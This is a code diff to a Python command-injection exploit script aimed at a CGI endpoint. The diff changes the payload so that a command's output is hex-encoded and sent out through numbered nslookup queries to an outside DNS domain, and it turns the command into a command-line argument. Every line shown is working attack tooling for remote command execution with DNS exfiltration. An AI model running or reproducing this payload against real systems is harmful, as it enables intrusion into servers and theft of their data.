@@ -11,6 +11,7 @@ import sys
 import base64
 import enum
 import secrets
+import argparse
 
 proxies = None
 #Comment out if not using a proxy like Burp, etc
@@ -77,7 +78,7 @@ def execute_cmd(cmd, dns_root):
 
     # Add the command, use simple while loop to execute nslookup on each line returned by xxd
     cmd_str = cmd
-    cmd_str += "|xxd -p|while read line;do nslookup $line.%s.%s;done" % (req_str, dns_root)
+    cmd_str += "|xxd -p|while read line;do ((c++));nslookup $line.$c.%s.%s; done;nslookup _._.%s.%s" % (req_str, dns_root,req_str, dns_root)
 
     exploit = get_payload(cmd_injection_wrapper, payload_template, cmd_str, dns_root)
     #print(exploit)
@@ -107,20 +108,29 @@ def get_payload(exploit_template, payload_template, cmd, dns_root):
     return exploit_wrapper
 
 
-# Set variables
-cmd = "ifconfig"
-dns_root = "m.z3.vc"
+if __name__ == "__main__":
 
-#Target URL
-url = "http://192.168.241.130/cgi-bin/test2.pl"
+    parser = argparse.ArgumentParser(description='Consort - Helper server for exploit interaction')
+    parser.add_argument('-c', help="Command", required=True)
 
-# Set Request Type
-req_verb = RequestVerb.POST
 
-#Set this to the parameter name for the POST request
-vuln_param_name = "full_batch_file"
+    # Set variables
+    args = parser.parse_args()
+    cmd = args.c
+    #cmd = "ifconfig"
 
-#Additional params
-additional_params = {}
+    dns_root = "m.z3.vc"
 
-execute_cmd(cmd, dns_root)
+    #Target URL
+    url = "http://192.168.241.130/cgi-bin/test2.pl"
+
+    # Set Request Type
+    req_verb = RequestVerb.POST
+
+    #Set this to the parameter name for the POST request
+    vuln_param_name = "full_batch_file"
+
+    #Additional params
+    additional_params = {}
+
+    execute_cmd(cmd, dns_root)
